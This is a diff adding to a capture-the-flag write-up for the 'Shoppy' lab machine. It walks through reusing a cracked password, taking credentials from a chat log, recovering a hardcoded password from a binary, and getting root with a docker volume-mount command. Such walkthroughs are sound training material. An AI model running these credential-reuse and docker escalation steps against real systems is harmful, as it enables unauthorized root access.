@@ -168,4 +168,143 @@ cracked_hashes file:
 6ebcea65320589ca4f2f1ce039975995:remembermethisway
 ```
 
-This has appears to be for user "John"
+This hash appears to be for user "josh"
+
+
+### Back to mattermost.shoppy.htb
+
+Trying to log in with:
+```
+User: josh
+Password: remembermethisway
+```
+**Successful!**
+
+### Exploring
+
+On the mattermost site, we can find some interesting information:
+
+> jaeger
+4:22 AM
+Hey @josh,
+For the deploy machine, you can create an account with these creds :
+username: jaeger
+password: Sh0ppyBest@pp!
+And deploy on it.
+
+> josh
+4:25 AM
+Oh I forgot to tell you, that we're going to use docker for the deployment, so I will add it to the first deploy
+
+So, we have a password and username for jaeger.
+
+```
+Username: jaeger
+Password: Sh0ppyBest@pp!
+```
+
+### SSH
+
+We can use the credentials we found to login via ssh:
+
+```
+ssh jaeger@10.10.11.180
+password: Sh0ppyBest@pp!
+```
+
+On the machine, we find `user.txt`.
+
+```
+cat user.txt
+
+8******************************4
+```
+
+### Enumeration
+
+Listing files with privileges:
+
+```
+sudo -l
+
+Matching Defaults entries for jaeger on shoppy:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+User jaeger may run the following commands on shoppy:
+    (deploy) /home/deploy/password-manager
+```
+
+This means we can run password-manager with user set to "deploy".
+
+Exploring the `/home/deploy` folder, we find the following 3 files:
+
+```
+creds.txt  password-manager  password-manager.cpp
+```
+
+Let's try running the password-manager...
+
+```
+sudo -u deploy ./password-manager
+
+Welcome to Josh password manager!
+Please enter your master password: test
+Access denied! This incident will be reported !
+```
+
+Well, that didn't work...
+
+Unfortunately, we also can't cat out the `creds.txt` or `password-manager.cpp` files.
+However, we can cat out the `password-manager` file itself!
+
+```
+<binary data>
+...
+...
+Welcome to Josh password manager!Please enter your master password: SampleAccess granted! Here is creds !cat /home/deploy/creds.txtAccess denied! This incident will be reported !
+...
+...
+<binary data>
+```
+
+This leads to us finding `Sample` as the master password! Let's try it out:
+
+```
+Please enter your master password: Sample
+Access granted! Here is creds !
+Deploy Creds :
+username: deploy
+password: Deploying@pp!
+```
+
+Awesome!
+
+### SSH (deploy)
+
+Logging in as deploy...
+
+We can run an id search
+
+```
+$ id
+uid=1001(deploy) gid=1001(deploy) groups=1001(deploy),998(docker)
+```
+
+We see a `docker` group!
+
+[GTFObins tells us that be can run docker to gain root shell with...](https://gtfobins.github.io/gtfobins/docker/)
+
+```
+docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+#
+```
+
+We then see that beautiful `#`. We are root!
+
+Lets cat the root flag!
+
+```
+cat root/root.txt
+4******************************b
+```
+
+**Shoppy: PWNED**
